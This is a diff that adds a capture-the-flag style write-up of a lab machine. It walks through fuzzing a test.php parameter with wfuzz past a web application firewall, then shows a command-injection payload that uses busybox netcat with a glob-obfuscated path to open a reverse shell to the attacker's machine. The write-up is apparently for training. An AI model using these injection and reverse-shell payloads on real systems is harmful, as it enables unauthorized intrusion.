@@ -54,3 +54,70 @@ Using the nikto tool to get the vulnearabilities
 ```
 
 So here I got the hidden file `test.php`
+![test.php page](./screenshots/test_php.png)
+
+Here is the test.php page but I didn't got any interesting stuff.
+
+Now I tested, the local file inclusive vulnearability, but WAP (Web Application Firewall) blocks it, so we need to bypass the filters and for this we have to supply some payloads until we get some response
+
+For this, I will be using `wfuzz`, a web application fuzzer used for brute-forcing and testing web parameters.
+
+```bash
+wfuzz -c -u 'http://192.168.100.14/test.php?file=FUZZ' -w /usr/share/wfuzz/wordlist/Injections/All_attack.txt --hc 403 --hw 159
+
+# -u target URL
+# -w wordlist
+# --hc 403 hides responses with HTTP status code 403
+# --hw 159 hides responses whose body has 159 words
+```
+
+Output:
+
+```bash
+
+┌──(kali㉿kali)-[~/Desktop/Machines_WriteUps/Minu_v1]
+└─$ wfuzz -c -u 'http://192.168.100.14/test.php?file=FUZZ' -w /usr/share/wfuzz/wordlist/Injections/All_attack.txt --hc 403 --hw 159
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://192.168.100.14/test.php?file=FUZZ
+Total requests: 468
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                 
+=====================================================================
+
+000000046:   200        41 L     163 W      2033 Ch     "|dir"                  
+000000045:   200        41 L     162 W      2040 Ch     "|id"                   
+
+Total time: 5.707429
+Processed Requests: 468
+Filtered Requests: 466
+Requests/sec.: 81.99838
+
+```
+
+So I got the following payload `|dir` and `|id` 
+![payload working](screenshots/payload_1.png)
+
+### Bypassing WAF
+
+So I tested and many payload and got the interesting one that is `which` through I go the nc binary path, so we can establish reverse shell connection with target machine using netcat, but we will need a vulnearable binary to execute the nc command
+
+The target machine is having `busybox` binary and its path is `/bin/busybox` so we can use this to execute the netcat.
+
+For busybox payload I will be using [GTFIO BIns](https://gtfobins.github.io/gtfobins/busybox/)
+
+So the payload goes as:
+
+```bash
+
+http://192.168.100.14/test.php?file=shell;busybox /b?n/nc 192.168.100.5 4433  -e sh
+
+```
+
+and got the reverse shell
+
+![reverse shell](./screenshots/rev_shell.png)
